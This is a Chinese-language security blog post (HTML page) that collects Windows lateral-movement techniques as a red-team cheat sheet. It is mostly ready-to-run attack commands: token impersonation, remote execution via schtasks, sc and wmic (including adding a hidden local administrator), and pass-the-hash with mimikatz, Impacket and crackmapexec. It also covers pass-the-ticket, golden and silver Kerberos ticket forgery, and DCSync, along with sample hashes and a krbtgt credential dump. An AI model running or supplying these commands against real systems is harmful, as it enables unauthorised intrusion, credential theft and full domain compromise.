<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="windows横向扩展常用命令总结，及工具使用方法。">
<meta property="og:type" content="article">
<meta property="og:title" content="windows横向扩展tips">
<meta property="og:url" content="http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/index.html">
<meta property="og:site_name" content="ceeeeeeb&#39;s blog">
<meta property="og:description" content="windows横向扩展常用命令总结，及工具使用方法。">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-03-04T08:06:00.000Z">
<meta property="article:modified_time" content="2020-03-11T19:35:57.597Z">
<meta property="article:author" content="ceeeeeeb">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>windows横向扩展tips</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/03/05/cobaltstrike%E5%86%85%E7%BD%91%E4%B8%AD%E7%BB%A7%E4%B8%8A%E7%BA%BF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&text=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&is_video=false&description=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=windows横向扩展tips&body=Check out this article: http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&name=windows横向扩展tips&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&t=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#入口点"><span class="toc-number">1.</span> <span class="toc-text">入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权-amp-降权"><span class="toc-number">2.</span> <span class="toc-text">提权&amp;降权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#降权"><span class="toc-number">2.1.</span> <span class="toc-text">降权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-number">2.2.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程执行命令方法"><span class="toc-number">3.</span> <span class="toc-text">远程执行命令方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工作组渗透"><span class="toc-number">4.</span> <span class="toc-text">工作组渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码喷射"><span class="toc-number">4.1.</span> <span class="toc-text">密码喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-010-08-067等溢出漏洞"><span class="toc-number">4.2.</span> <span class="toc-text">17-010,08-067等溢出漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常规web-服务渗透"><span class="toc-number">4.3.</span> <span class="toc-text">常规web,服务渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常见应用漏洞："><span class="toc-number">4.3.1.</span> <span class="toc-text">常见应用漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见语言反序列化漏洞"><span class="toc-number">4.3.2.</span> <span class="toc-text">常见语言反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库漏洞及配置不当"><span class="toc-number">4.3.3.</span> <span class="toc-text">数据库漏洞及配置不当</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）"><span class="toc-number">4.3.4.</span> <span class="toc-text">web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统备份文件（ghost）中读密码"><span class="toc-number">4.4.</span> <span class="toc-text">系统备份文件（ghost）中读密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-relay"><span class="toc-number">4.5.</span> <span class="toc-text">ntlm relay</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域渗透"><span class="toc-number">5.</span> <span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pth"><span class="toc-number">5.1.</span> <span class="toc-text">pth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptt"><span class="toc-number">5.2.</span> <span class="toc-text">ptt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#金票"><span class="toc-number">5.3.</span> <span class="toc-text">金票</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#银票"><span class="toc-number">5.4.</span> <span class="toc-text">银票</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068"><span class="toc-number">5.5.</span> <span class="toc-text">ms14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP漏洞利用"><span class="toc-number">5.6.</span> <span class="toc-text">GPP漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导出域控ntds-dit"><span class="toc-number">5.7.</span> <span class="toc-text">导出域控ntds.dit</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        windows横向扩展tips
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ceeeeeeb</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-04T08:06:00.000Z" itemprop="datePublished">2020-03-04</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>1.能出网 frp socks5。</p>
<p>代理msf进内网，可利用永恒之蓝（防火墙开启情况下未能成功），弱口令爆破，常见的kali下漏洞攻击。</p>
<p>2.webshell（不能出网）狗洞，冰蝎自带端口转发功能。</p>
<p>3.vpn（可进行smb协议类利用，如pth，net use等。socks不支持smb协议代理）</p>
<h2 id="提权-amp-降权"><a href="#提权-amp-降权" class="headerlink" title="提权&amp;降权"></a>提权&amp;降权</h2><h3 id="降权"><a href="#降权" class="headerlink" title="降权"></a>降权</h3><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">1.incognito.exe</span><br><span class="line">incognito.exe list_tokens -u</span><br><span class="line">incognito.exe<span class="built_in"> execute </span>-c <span class="string">"NT AUTHORITY\SYSTEM"</span> cmd.exe</span><br><span class="line">incognito.exe<span class="built_in"> execute </span>-c <span class="string">"WIN-R7MM90ERBMD\a"</span> cmd.exe</span><br><span class="line"></span><br><span class="line">2.Invoke-TokenManipulation</span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line">提权至system：Invoke-TokenManipulation -CreateProcess “cmd.exe” -Username “nt authority\system”</span><br><span class="line">复制进程token：Invoke-TokenManipulation -CreateProcess “cmd.exe” -ProcessId 500</span><br><span class="line">复制线程token：Invoke-TokenManipulation -CreateProcess “cmd.exe” -ThreadId 500</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>system</strong></p>
<p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows提权</a></p>
<p><strong>bypassUAC</strong></p>
<p><code>UACME</code></p>
<h2 id="远程执行命令方法"><a href="#远程执行命令方法" class="headerlink" title="远程执行命令方法"></a>远程执行命令方法</h2><p>1.at（系统权限）</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">利用计划任务at命令，常用的方法（系统权限）：</span><br><span class="line"></span><br><span class="line">net time</span><br><span class="line"></span><br><span class="line">at \\<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">23</span>:<span class="number">00</span> c:\winnt\system32/viliosn.exe</span><br><span class="line"></span><br><span class="line">at \\<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1</span> delete /yes #删除本机<span class="number">1</span>号任务</span><br></pre></td></tr></table></figure>

<p>2.schtasks(用户权限即可)</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn asp_net /tr <span class="string">"c:\windows\system32\cmd.exe /c cmd"</span> /sc once /st 00:00 /S<span class="built_in"> ip </span>/RU<span class="built_in"> System </span>/u<span class="built_in"> user </span>/p password</span><br><span class="line"></span><br><span class="line">schtasks /<span class="builtin-name">run</span> /tn asp_net /S<span class="built_in"> ip </span>/u<span class="built_in"> user </span>/p password /i</span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn asp_net /S<span class="built_in"> ip </span>/u<span class="built_in"> user </span>/p password</span><br></pre></td></tr></table></figure>

<p>3.sc 系统权限的sc用法 利用服务工具，指定用户权限启动</p>
<p>在192.130.16.22上创建一个xxoox的服务，程序执行命令为cmd.exe /c start c:\programdata\a+.bat</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">sc \\<span class="number">192.130</span><span class="number">.16</span><span class="number">.22</span> create xxoox binPath= <span class="string">"cmd.exe /c start c:\programdata\a+.bat"</span></span><br><span class="line">执行xxoox的服务，执行成功可能会提示错误<span class="number">1053</span>，不宜作为启动项，一般用用户权限也是临时的：</span><br><span class="line"></span><br><span class="line">sc \\<span class="number">192.130</span><span class="number">.16</span><span class="number">.22</span> start xxoox</span><br><span class="line"></span><br><span class="line">sc \\<span class="number">192.130</span><span class="number">.16</span><span class="number">.22</span> delete xxoox</span><br><span class="line">指定用户权限启动的用法</span><br><span class="line">在<span class="number">192.130</span><span class="number">.16</span><span class="number">.22</span>上指定administrator账户创建一个adminsec服务：</span><br><span class="line"></span><br><span class="line">sc \\<span class="number">192.130</span><span class="number">.16</span><span class="number">.22</span> create adminsec binpath = “c:\pass.exe” obj= “adminsec\administrator” passwrod= adminsec</span><br><span class="line"></span><br><span class="line">sc \\<span class="number">192.130</span><span class="number">.16</span><span class="number">.22</span> start adminsec</span><br></pre></td></tr></table></figure>

<p><strong>4.wmic</strong></p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.17</span>.<span class="number">138</span> /user:test /password:!@<span class="comment">#123QWE process call create c:\programdata\test.bat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###在远程系统上执行单条命令</span></span><br><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.17</span>.<span class="number">138</span> /user:test /password:!@<span class="comment">#123QWE process call create "cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在远程系统上运行exe文件</span></span><br><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.200</span>.<span class="number">20</span> /user:web\administrator /password:Web12345 process call create <span class="string">"cmd.exe /c calc.exe"</span></span><br></pre></td></tr></table></figure>

<p><strong>5.wmiexec.vbs</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment">###获取半交互式shell</span></span><br><span class="line">cscript.exe //nologo wmiexec.vbs /<span class="keyword">shell</span><span class="bash"> 192.168.17.138 <span class="built_in">test</span> !@<span class="comment">#123QWE</span></span></span><br><span class="line"><span class="comment">###在远程系统上执行单条命令</span></span><br><span class="line">cscript.exe wmiexec.vbs /<span class="keyword">cmd</span><span class="bash"> 192.168.17.138 <span class="built_in">test</span> !@<span class="comment">#123QWE "cmdkey /list"</span></span></span><br><span class="line"><span class="comment">###在远程系统上执行 bat 脚本</span></span><br><span class="line">cscript.exe wmiexec.vbs /<span class="keyword">cmd</span><span class="bash"> 192.168.17.138 <span class="built_in">test</span> !@<span class="comment">#123QWE c:\programdata\test.bat</span></span></span><br></pre></td></tr></table></figure>

<p><strong>6.PsRemoting</strong></p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先开启执行策略</span></span><br><span class="line"><span class="built_in">set-executionpolicy</span> <span class="string">unrestricted</span></span><br><span class="line"><span class="string">#</span>在目标机器上开启<span class="string">ps远</span>程功能</span><br><span class="line"><span class="string">enable-psremoting</span></span><br><span class="line"><span class="string">#</span>开启远程连接</span><br><span class="line"><span class="string">Enter-PSSession </span><span class="string">192.</span><span class="string">168.</span><span class="string">200.</span><span class="string">20 </span>-<span class="string">Credential </span> <span class="string">administrator</span></span><br></pre></td></tr></table></figure>



<h2 id="工作组渗透"><a href="#工作组渗透" class="headerlink" title="工作组渗透"></a>工作组渗透</h2><h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><h3 id="17-010-08-067等溢出漏洞"><a href="#17-010-08-067等溢出漏洞" class="headerlink" title="17-010,08-067等溢出漏洞"></a>17-010,08-067等溢出漏洞</h3><h3 id="常规web-服务渗透"><a href="#常规web-服务渗透" class="headerlink" title="常规web,服务渗透"></a>常规web,服务渗透</h3><h4 id="常见应用漏洞："><a href="#常见应用漏洞：" class="headerlink" title="常见应用漏洞："></a>常见应用漏洞：</h4><p>struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion</p>
<h4 id="常见语言反序列化漏洞"><a href="#常见语言反序列化漏洞" class="headerlink" title="常见语言反序列化漏洞"></a>常见语言反序列化漏洞</h4><p>php、Java、python、ruby、node.js</p>
<h4 id="数据库漏洞及配置不当"><a href="#数据库漏洞及配置不当" class="headerlink" title="数据库漏洞及配置不当"></a>数据库漏洞及配置不当</h4><p>mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当<br>内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…）</p>
<h4 id="web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）"><a href="#web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）" class="headerlink" title="web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）"></a>web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）</h4><h3 id="系统备份文件（ghost）中读密码"><a href="#系统备份文件（ghost）中读密码" class="headerlink" title="系统备份文件（ghost）中读密码"></a>系统备份文件（ghost）中读密码</h3><p>在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限</p>
<h3 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a>ntlm relay</h3><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h3><p>kb2871997，<strong>禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享。</strong></p>
<p>这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的 Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程连接。</p>
<p><strong>1.mimikatz</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:mssql /domain:de1ay /ntlm:<span class="number">161</span>cff084477fe596a5db81874498a24</span><br><span class="line">net use \\<span class="number">192.168</span><span class="number">.5</span><span class="number">.3</span>\c$</span><br><span class="line">对于<span class="number">8.1</span>/<span class="number">2012</span>r2，安装补丁kb2871997的Win <span class="number">7</span>/<span class="number">2008</span>r2/<span class="number">8</span>/<span class="number">2012</span>，可以使用AES keys代替NT hash</span><br></pre></td></tr></table></figure>

<p><strong>2.wmiexec&amp;smbexec</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">wmiexec.exe -hashes <span class="number">00000000000000000000000000000000</span>:<span class="number">4</span>aa0f66b8059750e6e410122cdf05ce2 offensive/<span class="symbol">dbadmin@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.20</span> <span class="string">"whoami"</span></span><br><span class="line"></span><br><span class="line">Impacket v0<span class="number">.9</span><span class="number">.17</span> - Copyright <span class="number">2002</span><span class="number">-2018</span> Core Security Technologies</span><br><span class="line">[*] SMBv3<span class="number">.0</span> dialect used</span><br><span class="line">offensive\dbadmin</span><br><span class="line"></span><br><span class="line">Invoke-WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> -Domain test.local -Username test1 -Hash <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">"calc.exe"</span> -verbose</span><br><span class="line"></span><br><span class="line">Invoke-SMBExec -Target <span class="number">192.168</span><span class="number">.0</span><span class="number">.2</span> -Domain test.local -Username test1 -Hash <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure>

<p><strong>3.crackmapexec批量pth</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">crackmapexec <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span> -u administrator -H ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>

<h3 id="ptt"><a href="#ptt" class="headerlink" title="ptt"></a>ptt</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">kekeo "tgt::ask /user:dbadmin /domain:offensive.local /ntlm:4aa0f66b8059750e6e410122cdf05ce2"</span><br><span class="line"> &gt; Ticket in file 'TGT_dbadmin@OFFENSIVE.LOCAL_krbtgt~offensive.local@OFFENSIVE.LOCAL.kirbi'</span><br><span class="line"> </span><br><span class="line">kekeo "kerberos::ptt TGT_dbadmin@OFFENSIVE.LOCAL_krbtgt~offensive.local@OFFENSIVE.LOCAL.kirbi"</span><br><span class="line">* File: 'TGT_administrator@OFFENSIVE.LOCAL_krbtgt~offensive.local@OFFENSIVE.LOCAL.kirbi': OK</span><br><span class="line"></span><br><span class="line">net use \\dc\c$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">golden</span><br><span class="line">/domain:test.local</span><br><span class="line">/sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span></span><br><span class="line">/target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local</span><br><span class="line">/service:cifs</span><br><span class="line">/rc4:d5304f9ea69523479560ca4ebb5a2155</span><br><span class="line">/user:silver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/domain:test.local</span><br><span class="line">/sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span></span><br><span class="line">/target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local</span><br><span class="line">/service:LDAP</span><br><span class="line">/rc4:d5304f9ea69523479560ca4ebb5a2155</span><br><span class="line">/user:krbtgt</span><br><span class="line"></span><br><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:LDAP /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:krbtgt /ptt"</span><br><span class="line"></span><br><span class="line">利用ptt导hash：mimikatz "lsadump::dcsync /dc:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /domain:test.local /user:krbtgt"</span><br></pre></td></tr></table></figure>

<h3 id="金票"><a href="#金票" class="headerlink" title="金票"></a>金票</h3><p>伪造黄金凭据需要具备下面条件：</p>
<ul>
<li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li>
<li>域名称</li>
<li>域的SID值</li>
<li>要伪造的用户名</li>
</ul>
<p>1.先登录域控制器，dump krbtgt用户的hash值,获取域sid</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account<span class="built_in"> Type </span>        : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 8/18/2019 3:35:31 AM</span><br><span class="line">Object Security ID   : S-1-5-21-1187620287-4058297830-2395299116-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 61d83c569b93bfcd4ca2087011361caa</span><br><span class="line">    ntlm- 0: 61d83c569b93bfcd4ca2087011361caa</span><br><span class="line">    lm  - 0: 8a0c759ba84902c107491a110cc5eb11</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 03e46263c90a310e6120dbb0443d2775</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">   <span class="built_in"> Default </span>Salt : OFFENSIVE.LOCALkrbtgt</span><br><span class="line">   <span class="built_in"> Default </span>Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : dbae18467bd2eeb7eb2679e759b2b14d0755c1a4c3757b2f475399bb4ddb73b2</span><br><span class="line">      aes128_hmac       (4096) : acf72b52482ca2fd5e3b4b7b4082bb98</span><br><span class="line">      des_cbc_md5       (4096) : 26cdb9166b8a5897</span><br></pre></td></tr></table></figure>
<p>2.切换到普通域用户的机器，生成TGT凭证,用户名为administrator</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">(1)</span><br><span class="line">kerberos::golden  /admin:darthvader  /domain:offensive.local  /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1187620287</span><span class="string">-4058297830</span><span class="string">-2395299116</span><span class="string">-502</span> /krbtgt:61d83c569b93bfcd4ca2087011361caa  /ptt</span><br><span class="line"></span><br><span class="line">(2)</span><br><span class="line">mimikatz "kerberos::golden /domain:offensive.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1187620287</span><span class="string">-4058297830</span><span class="string">-2395299116</span><span class="string">-502</span> /aes256:dbae18467bd2eeb7eb2679e759b2b14d0755c1a4c3757b2f475399bb4ddb73b2 /user:god</span><br><span class="line">/ticket:gold.kirbi"</span><br></pre></td></tr></table></figure>
<p>3.然后使用mimikatz将凭证注入进去,攻击成功:</p>
<p><code>mimikatz &quot;kerberos::ptt gold.kirbi&quot;</code></p>
<p>4.net use或者pstools即可连接</p>
<h3 id="银票"><a href="#银票" class="headerlink" title="银票"></a>银票</h3><p>1.先登录域控制器，dump krbtgt用户的hash值,获取域sid</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
<p>2.将hash保存下来，在普通域用户机器中进行ptt</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1218902331</span><span class="number">-2157346161</span><span class="number">-1782232778</span>  /target:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /rc4:<span class="number">8432</span>d4fa4430ecf56927dbabd1b4d36b  /service:cifs /user:mary /ptt</span><br></pre></td></tr></table></figure>

<p>3.net use或者pstools即可连接</p>
